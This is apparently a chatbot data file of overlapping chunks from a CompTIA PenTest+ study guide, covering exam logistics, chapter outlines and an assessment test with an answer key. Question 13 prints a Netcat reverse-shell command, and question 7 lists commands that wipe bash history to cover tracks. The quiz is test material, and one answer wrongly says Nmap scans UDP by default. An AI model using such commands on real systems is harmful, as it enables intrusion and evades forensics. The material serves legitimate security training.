Cloud+ CySA+ A+ Linux+ SecurityX Network+ Server+ PenTest+ Security+ CompTIA recommends that practitioners follow a cybersecurity career path that begins with Tech+ and A+ certifications and proceeds to include the Network+ and Security+ credentials to complete the core skills. From there, cybersecurity professionals may choose the PenTest+ and/or Cybersecurity Analyst+ (CySA+) certifications before attempting the SecurityX certification as a capstone credential. The CySA+ and PenTest+ exams are more advanced exams, intended for professionals with hands‐on experience who also possess the knowledge covered by the prior exams. CompTIA certifications are ISO/ANAB accredited, and they are used throughout multiple industries as a measure of technical skill and knowledge. In addition, CompTIA certifications, including the Security+ and the SecurityX, have been approved by the U.S. government as Information Assurance baseline certifications and are included
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and Security+ credentials to complete the core skills. From there, cybersecurity professionals may choose the PenTest+ and/or Cybersecurity Analyst+ (CySA+) certifications before attempting the SecurityX certification as a capstone credential. The CySA+ and PenTest+ exams are more advanced exams, intended for professionals with hands‐on experience who also possess the knowledge covered by the prior exams. CompTIA certifications are ISO/ANAB accredited, and they are used throughout multiple industries as a measure of technical skill and knowledge. In addition, CompTIA certifications, including the Security+ and the SecurityX, have been approved by the U.S. government as Information Assurance baseline certifications and are included in the State Department's Skills Incentive Program. The PenTest+ Exam The PenTest+ exam is designed to be a vendor‐neutral certification for penetration testers. It is intended to assess penetration testing engagement, reconnaissance, vulnerability assessment, and attacks and exploits, with a focus on network resiliency testing. Successful test‐takers will prove their ability plan and scope assessments, handle legal and compliance requirements, and perform vulnerability scanning and penetration testing activities using a variety of tools and techniques, and then analyze the results of those activities. It covers five major domains: 1. Engagement Management 2. Reconnaissance and Enumeration 3. Vulnerability Discovery and Analysis 4. Attacks and Exploits 5. Post‐exploitation and Lateral Movement These five areas include a range of subtopics, from scoping penetration tests to performing host enumeration and exploits, while focusing heavily on scenario‐based learning. The PenTest+ exam fits between the entry‐level Security+ exam and the SecurityX (formerly CompTIA Advanced Security Practitioner [CASP+]) certification, providing a mid‐career certification for those who are seeking the next step in their certification and career path while specializing in pentesting or vulnerability management. The PenTest+ exam is conducted in a format that CompTIA calls “performance‐based questions (PBQs).” This means that the exam uses hands‐on simulations using actual security tools and scenarios to perform tasks that match those found in the daily work of a security practitioner. There may be numerous types of exam questions, such as multiple‐choice, fill‐in‐the‐blank, multiple‐response, drag‐and‐drop, and image‐based problems. CompTIA recommends that test‐takers have three or four years of experience as a penetration tester before taking this exam. As of 2024, the exam costs $404 in the United States, with roughly equivalent prices in other locations around the globe. More details about the PenTest+ exam and how to take it can be found at: https://www.comptia.org/certifications/pentest Study and Exam Preparation Tips A test preparation book like this cannot teach you every possible security software package, scenario, and specific technology that may appear on the exam. Instead, you should focus on whether you are familiar with the type or category of technology, tool, process, or scenario presented as you read the book. If you identify a gap, you may want to find additional tools to help you learn more about those topics. Additional resources for hands‐on exercises include the following: Exploit-Exercises.com provides virtual machines, documentation, and challenges covering a wide range of security issues at https://exploitexercises.com. Hacking‐Lab provides capture‐the‐flag (CTF) exercises in a variety
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	preparation book like this cannot teach you every possible security software package, scenario, and specific technology that may appear on the exam. Instead, you should focus on whether you are familiar with the type or category of technology, tool, process, or scenario presented as you read the book. If you identify a gap, you may want to find additional tools to help you learn more about those topics. Additional resources for hands‐on exercises include the following: Exploit-Exercises.com provides virtual machines, documentation, and challenges covering a wide range of security issues at https://exploitexercises.com. Hacking‐Lab provides capture‐the‐flag (CTF) exercises in a variety of fields at https://hacking-lab.com. The OWASP Hacking Lab provides excellent web application–focused exercises at https://owasp.org/www-project-hacking-lab. PentesterLab provides a subscription‐based access to penetration testing exercises at https://pentesterlab.com/exercises. Since the exam uses scenario‐based learning, expect the questions to involve analysis and thought rather than relying on simple memorization. As you might expect, it is impossible to replicate that experience in a book, so the questions here are intended to help you be confident that you know the topic well enough to think through hands‐on exercises. Taking the Exam Once you are fully prepared to take the exam, you can visit the CompTIA website to purchase your exam voucher: http://store.comptia.org Currently, CompTIA offers two options for taking the exam: an in‐person exam at a testing center and an at‐home exam that you take on your own computer. This book includes a coupon that you may use to save 10 percent on your CompTIA exam registration. In‐Person Exams CompTIA partners with Pearson VUE's testing centers, so your next step will be to locate a testing center near you. In the United States, you can do this based on your address or your ZIP code, while non‐U.S. test takers may find it easier to enter their city and country. You can search for a test center near you at the Pearson VUE website, where you will need to navigate to “Find a test center.” https://www.pearsonvue.com/us/en/comptia.html Now that you know where you'd like to take the exam, simply use the link on that site to set up a testing account and schedule an exam. On the day of the test, take two forms of identification, and make sure to show up with plenty of time before the exam starts. Remember that you will not be able to take your notes, electronic devices (including smartphones and watches), or other materials in with you. At‐Home Exams CompTIA began offering online exam proctoring in 2020 through the OnVUE program. Candidates using this approach will take the exam at their home or office and be proctored over a webcam by a remote proctor. For more information on the at‐home testing option, visit: https://www.pearsonvue.com/us/en/comptia/onvue.html The OnVUE platform requires specialized software. Be sure to run the OnVUE system test before you register for an online exam. This will save you problems if your system is not compatible with the software. After the PenTest+ Exam Once you have taken the exam, you will
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	or other materials in with you. At‐Home Exams CompTIA began offering online exam proctoring in 2020 through the OnVUE program. Candidates using this approach will take the exam at their home or office and be proctored over a webcam by a remote proctor. For more information on the at‐home testing option, visit: https://www.pearsonvue.com/us/en/comptia/onvue.html The OnVUE platform requires specialized software. Be sure to run the OnVUE system test before you register for an online exam. This will save you problems if your system is not compatible with the software. After the PenTest+ Exam Once you have taken the exam, you will be notified of your score immediately, so you'll know if you passed the test right away. You should keep track of your score report with your exam registration records and the email address you used to register for the exam. If you've passed, you'll receive a handsome certificate, similar to the one shown here: Maintaining Your Certification CompTIA certifications must be renewed on a periodic basis. To renew your certification, you can either pass the most current version of the exam, earn a qualifying higher‐level CompTIA or industry certification, or complete sufficient continuing education activities to earn enough continuing education units (CEUs) to renew it. CompTIA provides information on renewals via their website here: https://www.comptia.org/continuing-education When you sign up to renew your certification, you will be asked to agree to the CE program's Code of Ethics, to pay a renewal fee, and to submit the materials required for your chosen renewal method. A full list of the industry certifications you can use to acquire CEUs toward renewing the PenTest+ can be found at: https://www.comptia.org/continuing-education/choose/renewing-withmultiple-activities/training-and-higher-education/pentest-educational-units What Does This Book Cover? This book is designed to cover the five domains included in the PenTest+ exam: Chapter 1: Penetration Testing Learn the basics of penetration testing as you begin an in‐depth exploration of the field. In this chapter, you will learn why organizations conduct penetration testing and the role of the penetration test in a cybersecurity program. Chapter 2: Planning and Scoping Penetration Tests Proper planning is critical to a penetration test. In this chapter, you will learn how to define the rules of engagement, scope, budget, and other details that need to be determined before a penetration test starts. Details of contracts, compliance and legal concerns, and authorization are all discussed so that you can make sure you are covered before a test starts. Chapter 3: Information Gathering Gathering information is one of the earliest stages of a penetration test. In this chapter you will learn how to gather open source intelligence (OSINT) using passive means. Once you have OSINT, you can leverage the active scanning and enumeration techniques and tools you will learn about in the second half of the chapter. Chapter 4: Vulnerability Scanning Managing vulnerabilities helps to keep your systems secure. In this chapter, you will learn how to conduct vulnerability scans and use them as an important information source for penetration testing. Chapter 5: Analyzing Vulnerability Scans Vulnerability
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	test starts. Chapter 3: Information Gathering Gathering information is one of the earliest stages of a penetration test. In this chapter you will learn how to gather open source intelligence (OSINT) using passive means. Once you have OSINT, you can leverage the active scanning and enumeration techniques and tools you will learn about in the second half of the chapter. Chapter 4: Vulnerability Scanning Managing vulnerabilities helps to keep your systems secure. In this chapter, you will learn how to conduct vulnerability scans and use them as an important information source for penetration testing. Chapter 5: Analyzing Vulnerability Scans Vulnerability reports can contain huge amounts of data about potential problems with systems. In this chapter, you will learn how to read and analyze a vulnerability scan report, what CVSS scoring is and what it means, as well as how to choose the appropriate actions to remediate the issues you have found. Along the way, you will explore common types of vulnerabilities, their impact on systems and networks, and how they might be exploited during a penetration test. Chapter 6: Exploit and Pivot Once you have a list of vulnerabilities, you can move on to prioritizing the exploits based on the likelihood of success and availability of attack methods. In this chapter, you will explore common attack techniques and tools and when to use them. Once you have gained access, you can pivot to other systems or networks that may not have been accessible previously. You will learn tools and techniques that are useful for lateral movement once you're inside a network's security boundaries, how to cover your tracks, and how to hide the evidence of your efforts. Chapter 7: Exploiting Network Vulnerabilities Penetration testers often start with network attacks against common services. In this chapter, you will explore the most frequently attacked services, including NetBIOS, SMB, SNMP, and others. You will learn about on‐path attacks, network‐specific techniques, and how to attack wireless networks and systems. Chapter 8: Exploiting Physical and Social Vulnerabilities Humans are the most vulnerable part of an organization's security posture, and penetration testers need to know how to exploit the human element of an organization. In this chapter, you will explore social engineering methods, motivation techniques, and social engineering tools. Once you know how to leverage human behavior, you will explore how to gain and leverage physical access to buildings and other secured areas. Chapter 9: Exploiting Application Vulnerabilities Applications are the go‐to starting point for testers and hackers alike. If an attacker can break through the security of a web application and access the back‐end systems supporting that application, they often have the starting point they need to wage a full‐scale attack. In this chapter, we examine many of the application vulnerabilities that are commonly exploited during penetration tests. Chapter 10: Exploiting Host Vulnerabilities Attacking hosts relies on understanding operating system–specific vulnerabilities for Windows and Linux as well as common problems found on almost all operating systems. In this chapter, you will learn about attack methods
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Application Vulnerabilities Applications are the go‐to starting point for testers and hackers alike. If an attacker can break through the security of a web application and access the back‐end systems supporting that application, they often have the starting point they need to wage a full‐scale attack. In this chapter, we examine many of the application vulnerabilities that are commonly exploited during penetration tests. Chapter 10: Exploiting Host Vulnerabilities Attacking hosts relies on understanding operating system–specific vulnerabilities for Windows and Linux as well as common problems found on almost all operating systems. In this chapter, you will learn about attack methods used against both Windows and Linux hosts, credential attacks and password cracking, how virtual machines and container attacks work, and attack vectors and techniques used against cloud technologies. You'll also explore attacks against mobile devices, IoT and industrial control systems, data storage, and other specialized systems. Chapter 11: Reporting and Communication Penetration tests are only useful to the organization if the penetration testers are able to effectively communicate the state of the organization to management and technical staff. In this chapter, we turn our attention to that crucial final phase of a penetration test: reporting and communicating our results. Chapter 12: Scripting for Penetration Testing Scripting languages provide a means to automate the repetitive tasks of penetration testing. Penetration testers do not need to be software engineers. Generally speaking, pentesters don't write extremely lengthy code or develop applications that will be used by many other people. The primary development skill that a penetration tester should acquire is the ability to read fairly simple scripts written in a variety of common languages and adapt them to their own unique needs. That's what we'll explore in this chapter. Practice Test Once you have completed your studies, the practice exam will provide you with a chance to test your knowledge. Use this exam to find places where you may need to study more or to verify that you are ready to tackle the exam. We'll be rooting for you! Appendix: Answers to Review Questions The Appendix has answers to the review questions you will find at the end of each chapter. Objective Mapping The following listing summarizes how the major PenTest+ objective areas map to the chapters in this book. If you want to study a specific domain, this mapping can help you identify where to focus your reading. Engagement Management: Chapters 2, 11 Reconnaissance and Enumeration: Chapters 3, 12 Vulnerability Discovery and Analysis: Chapters 4, 5, 6, 7, 8, 9, 10 Attacks and Exploits: Chapters 7, 8, 9, 10, 12 Post‐exploitation and Lateral Movement: Chapters 6, 11 Later in this introduction you'll find a detailed map showing where every objective topic is covered. The book is written to build your knowledge as you progress through it, so starting at the beginning is a good idea. Each chapter includes notes on important content and practice questions to help you test your knowledge. Once you are ready, a complete practice test is provided to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	11 Reconnaissance and Enumeration: Chapters 3, 12 Vulnerability Discovery and Analysis: Chapters 4, 5, 6, 7, 8, 9, 10 Attacks and Exploits: Chapters 7, 8, 9, 10, 12 Post‐exploitation and Lateral Movement: Chapters 6, 11 Later in this introduction you'll find a detailed map showing where every objective topic is covered. The book is written to build your knowledge as you progress through it, so starting at the beginning is a good idea. Each chapter includes notes on important content and practice questions to help you test your knowledge. Once you are ready, a complete practice test is provided to assess your knowledge. Study Guide Elements This study guide uses a number of common elements to help you prepare. These include the following: Summaries The summary section of each chapter briefly explains the chapter, allowing you to easily understand what it covers. Exam Essentials The exam essentials focus on major exam topics and critical knowledge that you should take into the test. The exam essentials focus on the exam objectives provided by CompTIA. Chapter Review Questions A set of questions at the end of each chapter will help you assess your knowledge and whether you are ready to take the exam based on your knowledge of that chapter's topics. Lab Exercises The lab exercises provide more in‐depth practice opportunities to expand your skills and to better prepare for performance‐based testing on the PenTest+ exam. Real‐World Scenarios The real‐world scenarios included in each chapter tell stories and provide examples of how topics in the chapter look from the point of view of a security professional. They include current events, personal experience, and approaches to actual problems. Interactive Online Learning Environment The interactive online learning environment that accompanies CompTIA® PenTest+® Study Guide: Exam PT0‐003, Third Edition, provides a test bank with study tools to help you prepare for the certification exam—and increase your chances of passing it the first time! The test bank includes the following elements: Sample Tests All of the questions in this book are available online, including the assessment test, which you'll find at the end of this introduction, and the chapter tests that include the review questions at the end of each chapter. In addition, there is a practice exam. Use these questions to test your knowledge of the study guide material. The online test bank runs on multiple devices. Flashcards Questions are provided in digital flashcard format (a question followed by a single correct answer). You can use the flashcards to reinforce your learning and provide last‐minute test prep before the exam. Other Study Tools A glossary of key terms from this book and their definitions is available as a fully searchable PDF. Go to http://www.wiley.com/go/sybextestprep to register and gain access to this interactive online learning environment and test bank with study tools. Like all exams, the PenTest+ certification from CompTIA is updated periodically and may eventually be retired or replaced. At some point after CompTIA is no longer offering this exam, the old editions of our
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	(a question followed by a single correct answer). You can use the flashcards to reinforce your learning and provide last‐minute test prep before the exam. Other Study Tools A glossary of key terms from this book and their definitions is available as a fully searchable PDF. Go to http://www.wiley.com/go/sybextestprep to register and gain access to this interactive online learning environment and test bank with study tools. Like all exams, the PenTest+ certification from CompTIA is updated periodically and may eventually be retired or replaced. At some point after CompTIA is no longer offering this exam, the old editions of our books and online tools will be retired. If you have purchased this book after the exam was retired, or are attempting to register in the Sybex online learning environment after the exam was retired, please know that we make no guarantees that this exam's online Sybex tools will be available once the exam is no longer available. CompTIA PenTest+ Certification Exam Objectives The CompTIA PenTest+ Study Guide has been written to cover every PenTest+ exam objective at a level appropriate to its exam weighting. The following table provides a breakdown of this book's exam coverage, showing you the weight of each section and the chapter where each objective or subobjective is covered. Domain Percentage of Exam 1.0 Engagement Management 13% Domain Percentage of Exam 2.0 Reconnaissance and Enumeration 3.0 Vulnerability Discovery and Analysis 4.0 Attacks and Exploits 21% 17% 35% 5.0 Post‐exploitation and Lateral Movement 14% Total 100% 1.0 Engagement Management Exam Objective 1.1 Summarize pre‐engagement activities 1.2 Explain collaboration and communication activities Chapter 2 11 1.3 Compare and contrast testing frameworks and methodologies 2 1.4 Explain the components of a penetration test report 11 1.5 Given a scenario, analyze the findings and recommend the 11 appropriate remediation within a report 2.0 Reconnaissance and Enumeration Exam Objective 2.1 Given a scenario, apply information gathering techniques 2.2 Given a scenario, apply enumeration techniques Chapter 3 3 2.3 Given a scenario, modify scripts for reconnaissance and enumeration 2.4 Given a scenario, use the appropriate tools for reconnaissance and enumeration 12 3 3.0 Vulnerability Discovery and Analysis Exam Objective 3.1 Given a scenario, conduct vulnerability discovery using various techniques Chapter(s) 4, 6, 7, 9, 10 Exam Objective 3.2 Given a scenario, analyze output from reconnaissance, scanning, and enumeration phases Chapter(s) 5 3.3 Explain physical security concepts 8 4.0 Attacks and Exploits Exam Objective 4.2 Given a scenario, perform network attacks using the appropriate tools Chapter 7 4.3 Given a scenario, perform authentication attacks using the appropriate tools 4.4 Given a scenario, perform host‐based attacks using the appropriate tools 4.5 Given a scenario, perform web application attacks using the appropriate tools 10 4.6 Given a scenario, perform cloud‐based attacks using the appropriate tools 4.7 Given a scenario, perform wireless attacks using the appropriate tools 4.8 Given a scenario, perform social engineering attacks using the appropriate tools 10 4.9 Explain common attacks against specialized systems 4.10 Given a scenario, use scripting to automate attacks 10
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	4.2 Given a scenario, perform network attacks using the appropriate tools Chapter 7 4.3 Given a scenario, perform authentication attacks using the appropriate tools 4.4 Given a scenario, perform host‐based attacks using the appropriate tools 4.5 Given a scenario, perform web application attacks using the appropriate tools 10 4.6 Given a scenario, perform cloud‐based attacks using the appropriate tools 4.7 Given a scenario, perform wireless attacks using the appropriate tools 4.8 Given a scenario, perform social engineering attacks using the appropriate tools 10 4.9 Explain common attacks against specialized systems 4.10 Given a scenario, use scripting to automate attacks 10 12 10 9 7 8 5.0 Post‐exploitation and Lateral Movement Exam Objective Chapter 5.1 Given a scenario, perform tasks to establish and maintain 6 persistence 5.2 Given a scenario, perform tasks to move laterally throughout 6 the environment 5.3 Summarize concepts related to staging and exfiltration 6 Exam Objective 5.4 Explain cleanup and restoration activities Chapter 11 How to Contact the Publisher If you believe you have found a mistake in this book, please bring it to our attention. At John Wiley & Sons, we understand how important it is to provide our customers with accurate content, but even with our best efforts an error may occur. In order to submit your possible errata, please email it to our Customer Service Team at wileysupport@wiley.com with the subject line “Possible Book Errata Submission.” Assessment Test If you're considering taking the PenTest+ exam, you should have already taken and passed the CompTIA Security+ and Network+ exams or have equivalent experience—typically at least three to four years of experience in the field. You may also already hold other equivalent or related certifications. The following assessment test will help to make sure you have the knowledge that you need before you tackle the PenTest+ certification, and it will help you determine where you may want to spend the most time with this book. 1. Ricky is conducting a penetration test against a web application and is looking for potential vulnerabilities to exploit. Which of the following vulnerabilities does not commonly exist in web applications? A. SQL injection B. VM escape C. Buffer overflow D. Cross‐site scripting 2. What specialized type of legal document is often used to protect the confidentiality of data and other information that penetration testers may encounter? A. An SOW B. An NDA C. An MSA D. A noncompete 3. Chris is assisting Ricky with his penetration test and would like to extend the vulnerability search to include the use of dynamic testing. Which one of the following tools can he use as an interception proxy? A. ZAP B. Nessus C. SonarQube D. OllyDbg 4. Matt is part of a penetration testing team and is using a standard toolkit developed by his team. He is executing a password cracking script named password.sh. What language is this script most likely written in? A. PowerShell B. Bash C. Ruby D. Python 5. Renee is conducting a penetration test and discovers evidence that one
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	is assisting Ricky with his penetration test and would like to extend the vulnerability search to include the use of dynamic testing. Which one of the following tools can he use as an interception proxy? A. ZAP B. Nessus C. SonarQube D. OllyDbg 4. Matt is part of a penetration testing team and is using a standard toolkit developed by his team. He is executing a password cracking script named password.sh. What language is this script most likely written in? A. PowerShell B. Bash C. Ruby D. Python 5. Renee is conducting a penetration test and discovers evidence that one of the systems she is exploring was already compromised by an attacker. What action should she take immediately after confirming her suspicions? A. Record the details in the penetration testing report. B. Remediate the vulnerability that allowed her to gain access. C. Report the potential compromise to the client. D. No further action is necessary because Renee's scope of work is limited to penetration testing. 6. Which of the following vulnerability scanning methods will provide the most accurate detail during a scan? A. Unknown environment B. Authenticated C. Internal view D. External view 7. Annie wants to cover her tracks after compromising a Linux system. If she wants to permanently remove evidence of the commands she inputs to a Bash shell, which of the following commands should she use? A. history ‐c B. kill ‐9 $$ C. echo "" > /~/.bash_history D. ln /dev/null ~/.bash_history ‐sf 8. Kaiden would like to perform an automated web application security scan of a new system before it is moved into production. Which one of the following tools is best suited for this task? A. Nmap B. Nikto C. Wireshark D. CeWL 9. Steve is engaged in a penetration test and is gathering information without actively scanning or otherwise probing his target. What type of information is he gathering? A. OSINT B. HSI C. Background D. None of the above 10. Which of the following activities constitutes a violation of integrity? A. Systems were taken offline, resulting in a loss of business income. B. Sensitive or proprietary information was changed or deleted. C. Protected information was accessed or exfiltrated. D. Sensitive personally identifiable information was accessed or exfiltrated. 11. Ted wants to scan a remote system using Nmap and uses the following command: nmap 149.89.80.0/24 How many TCP ports will he scan? A. 256 B. 1,000 C. 1,024 D. 65,535 12. Brian is conducting a thorough technical review of his organization's web servers. He is specifically looking for signs that the servers may have been breached in the past. What term best describes this activity? A. Penetration testing B. Vulnerability scanning C. Remediation D. Threat hunting 13. Liam executes the following command on a compromised system: nc 10.1.10.1 7337 -e /bin/sh What has he done? A. Started a reverse shell using Netcat B. Captured traffic on the Ethernet port to the console via Netcat C. Set up a bind shell using Netcat D. None
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	B. 1,000 C. 1,024 D. 65,535 12. Brian is conducting a thorough technical review of his organization's web servers. He is specifically looking for signs that the servers may have been breached in the past. What term best describes this activity? A. Penetration testing B. Vulnerability scanning C. Remediation D. Threat hunting 13. Liam executes the following command on a compromised system: nc 10.1.10.1 7337 -e /bin/sh What has he done? A. Started a reverse shell using Netcat B. Captured traffic on the Ethernet port to the console via Netcat C. Set up a bind shell using Netcat D. None of the above 14. Dan is attempting to use VLAN hopping to send traffic to VLANs other than the one he is on. What technique does the following diagram show? A. A double jump B. A powerhop C. Double tagging D. VLAN squeezing 15. Alaina wants to conduct an on‐path attack against a target system. What technique can she use to make it appear that she has the IP address of a trusted server? A. ARP spoofing B. IP proofing C. DHCP pirating D. Spoofmastering 16. Michael's social engineering attack relies on telling the staff members he contacts that others have provided the information that he is requesting. What motivation technique is he using? A. Authority B. Scarcity C. Likeness D. Social proof 17. Vincent wants to gain access to workstations at his target but cannot find a way into the building. What technique can he use to do this if he is also unable to gain access remotely or on‐site via the network? A. Shoulder surfing B. Kerberoasting C. USB key drop D. Quid pro quo 18. Jennifer is reviewing files in a directory on a Linux system and sees a file listed with the following attributes. What has she discovered? -rwsr-xr—1 root kismet 653905 Nov 4 2016 /usr/bin/kismet_capture A. An encrypted file B. A hashed file C. A SUID file D. A SIP file 19. Which of the following tools is best suited to querying data provided by organizations like the American Registry for Internet Numbers (ARIN) as part of a footprinting or reconnaissance exercise? A. Nmap B. Traceroute C. regmon D. Whois 20. Chris believes that the Linux system he has compromised is a virtual machine. Which of the following techniques will not provide useful hints about whether or not the system is a VM? A. Run system‐detect‐virt. B. Run ls ‐l /dev/disk/by‐id. C. Run wmic baseboard to get manufacturer, product. D. Run dmidecode to retrieve hardware information. Answers to Assessment Test 1. B. Web applications commonly experience SQL injection, buffer overflow, and cross‐site scripting vulnerabilities. Virtual machine (VM) escape attacks work against the hypervisor of a virtualization platform and are not generally exploitable over the web. You'll learn more about all of these vulnerabilities in Chapters 5 and 9. 2. B. A nondisclosure agreement (NDA) is a legal agreement that is designed to protect the confidentiality of the client's data and other information that the penetration
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	system‐detect‐virt. B. Run ls ‐l /dev/disk/by‐id. C. Run wmic baseboard to get manufacturer, product. D. Run dmidecode to retrieve hardware information. Answers to Assessment Test 1. B. Web applications commonly experience SQL injection, buffer overflow, and cross‐site scripting vulnerabilities. Virtual machine (VM) escape attacks work against the hypervisor of a virtualization platform and are not generally exploitable over the web. You'll learn more about all of these vulnerabilities in Chapters 5 and 9. 2. B. A nondisclosure agreement (NDA) is a legal agreement that is designed to protect the confidentiality of the client's data and other information that the penetration tester may encounter during the test. An SOW is a statement of work, which defines what will be done during an engagement, an MSA is a master services agreement that sets the overall terms between two organizations (which then use SOWs to describe the actual work), and noncompetes are just that—an agreement that prevents competition, usually by preventing an employee from working for a competitor for a period of time after their current job ends. You'll learn more about the legal documents that are part of a penetration test in Chapter 2. 3. A. The Zed Attack Proxy (ZAP) from the Open Worldwide Application Security Project (OWASP) is an interception proxy that is very useful in penetration testing. Nessus is a vulnerability scanner that you'll learn more about in Chapter 4. SonarQube is a static, not dynamic, software testing tool, and OllyDbg is a debugger. You'll learn more about these tools in Chapter 9. 4. B. The .sh file extension is commonly used for Bash scripts. PowerShell scripts usually have a .ps1 extension. Ruby scripts use the .rb extension, and Python scripts end with .py. You'll learn more about these languages in Chapter 12. 5. C. When penetration testers discover indicators of an ongoing or past compromise, they should immediately inform management and recommend that the organization activate its cybersecurity incident response process. You'll learn more about reporting and communication in Chapter 11. 6. B. An authenticated, or credentialed, scan provides the most detailed view of the system. Unknown environment assessments presume no knowledge of a system and would not have credentials or an agent to work with on the system. Internal views typically provide more detail than external views, but neither provides the same level of detail that credentials can allow. You'll learn more about authenticated scanning in Chapter 4. 7. D. Although all of these commands are useful for covering her tracks, only linking /dev/null to .bash_history will prevent the Bash history file from containing anything. Chapters 6 and 10 cover compromising hosts and hiding your tracks. 8. B. It's very important to know the use and purpose of various penetration testing tools when taking the PenTest+ exam. Nikto is the best tool to meet Kaiden's needs in this scenario, since it is a dedicated web application scanning tool. Nmap is a port scanner, and Wireshark is a packet analysis tool. The Custom Wordlist Generator (CeWL) is used
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	4. 7. D. Although all of these commands are useful for covering her tracks, only linking /dev/null to .bash_history will prevent the Bash history file from containing anything. Chapters 6 and 10 cover compromising hosts and hiding your tracks. 8. B. It's very important to know the use and purpose of various penetration testing tools when taking the PenTest+ exam. Nikto is the best tool to meet Kaiden's needs in this scenario, since it is a dedicated web application scanning tool. Nmap is a port scanner, and Wireshark is a packet analysis tool. The Custom Wordlist Generator (CeWL) is used to spider websites for keywords. None of the latter three tools perform web application security testing. You'll learn more about Nikto in Chapter 4. 9. A. OSINT, or open source intelligence, is information that can be gathered passively. Passive information gathering is useful because it is not typically visible to targets and can provide valuable information about systems, networks, and details that guide the active portion of a penetration test. Chapter 3 covers OSINT in more detail. 10. B. Integrity breaches involve data being modified or deleted. When systems are taken offline it is an availability issue, protected information being accessed might be classified as a breach of proprietary information, and sensitive personally identifiable information access would typically be classified as a privacy breach. You will learn more about three goals of security—confidentiality, integrity, and availability—in Chapter 1. 11. B. By default, Nmap will scan the 1,000 most common ports for both TCP and UDP. Chapter 3 covers Nmap and port scanning, including details of what Nmap does by default and how. 12. D. Threat hunting uses the attacker mindset to search the organization's technology infrastructure for the artifacts of a successful attack. Threat hunters ask themselves what a hacker might do and what type of evidence they might leave behind and then go in search of that evidence. Brian's activity clearly fits this definition. You'll learn more about threat hunting in Chapter 1. 13. A. Liam has used Netcat to set up a reverse shell. This will connect to 10.1.10.1 on port 7337 and connect it to a Bash shell. Chapters 6 and 10 provide information about setting up remote access once you have compromised a system. 14. C. This is an example of a double‐tagging attack used against 802.1q interfaces. The first tag will be stripped, allowing the second tag to be read as the VLAN tag for the packet. Double jumps may help video gamers, but the other two answers were made up for this question. Chapter 7 digs into network vulnerabilities and exploits. 15. A. ARP spoofing attacks rely on responding to a system's ARP queries faster than the actual target can, thus allowing the attacker to provide false information. Once accepted, the attacker's system can then conduct an on‐path attack. Chapter 7 explores on‐path attacks, methods, and uses. 16. D. Social engineering attacks that rely on social proof rely on persuading the target that other
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	second tag to be read as the VLAN tag for the packet. Double jumps may help video gamers, but the other two answers were made up for this question. Chapter 7 digs into network vulnerabilities and exploits. 15. A. ARP spoofing attacks rely on responding to a system's ARP queries faster than the actual target can, thus allowing the attacker to provide false information. Once accepted, the attacker's system can then conduct an on‐path attack. Chapter 7 explores on‐path attacks, methods, and uses. 16. D. Social engineering attacks that rely on social proof rely on persuading the target that other people have behaved similarly. Likeness may sound similar, but it relies on building trust and then persuading the target that they have things in common with the penetration tester. Chapter 8 covers social engineering and how to exploit human behaviors. 17. C. A USB key drop is a form of physical honeypot that can be used to tempt employees at a target organization into picking up and accessing USB drives that are distributed to places they are likely to be found. Typically one or more files will be placed on the drive that are tempting but conceal penetration testing tools that will install Trojans or remote access tools once accessed. Chapter 8 also covers physical security attacks, including techniques like key drops. 18. C. The s in the file attributes indicates that this is a SETUID or SUID file that allows it to run as its owner. Chapter 10 discusses vulnerabilities in Linux, including how to leverage vulnerable SUID files. 19. D. Regional Internet registries like ARIN are best queried either via their websites or using tools like Whois. Nmap is a useful port scanning utility, traceroute is used for testing the path packets take to a remote system, and regmon is an outdated Windows Registry tool that has been supplanted by Process Monitor. You'll read more about OSINT in Chapter 3. 20. C. All of these commands are useful ways to determine if a system is virtualized, but wmic is a Windows tool. You'll learn about VM escape and detection in Chapter 10. Chapter 1 Penetration Testing Hackers employ a wide variety of tools to gain unauthorized access to systems, networks, and information. Automated tools, including network scanners, software debuggers, password crackers, exploitation frameworks, and malware, do play an important role in the attacker's toolkit. Cybersecurity professionals defending against attacks should have access to the same tools in order to identify weaknesses in their own defenses that an attacker might exploit. These automated tools are not, however, the most important tools at a hacker's disposal. The most important tool used by attackers is something that cybersecurity professionals can't download or purchase. It's the power and creativity of the human mind. Skilled attackers leverage quite a few automated tools as they seek to defeat cybersecurity defenses, but the true test of their ability is how well they are able to synthesize the information provided by those tools and pinpoint potential
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attacks should have access to the same tools in order to identify weaknesses in their own defenses that an attacker might exploit. These automated tools are not, however, the most important tools at a hacker's disposal. The most important tool used by attackers is something that cybersecurity professionals can't download or purchase. It's the power and creativity of the human mind. Skilled attackers leverage quite a few automated tools as they seek to defeat cybersecurity defenses, but the true test of their ability is how well they are able to synthesize the information provided by those tools and pinpoint potential weaknesses in an organization's cybersecurity defenses. What Is Penetration Testing? Penetration testing seeks to bridge the gap between the rote use of technical tools to test an organization's security and the power of those tools when placed in the hands of a skilled and determined attacker. Penetration tests are authorized, legal attempts to defeat an organization's security controls and gain unintended access. The tests are time‐consuming and require staff who are as skilled and determined as the real‐world attackers who will attempt to compromise the organization. However, they're also the most effective way for an organization to gain a complete picture of its security vulnerability. Cybersecurity Goals Cybersecurity professionals use a well‐known model to describe the goals of information security. The CIA triad, shown in Figure 1.1, includes the three main characteristics of information that cybersecurity programs seek to protect: Confidentiality measures seek to prevent unauthorized access to information or systems. Integrity measures seek to prevent unauthorized modification of information or systems. Availability measures seek to ensure that legitimate use of information and systems remains possible. FIGURE 1.1 The CIA triad Attackers, and therefore penetration testers, seek to undermine these goals and achieve three corresponding goals of their own. The attackers’ goals are known as the DAD triad, shown in Figure 1.2: 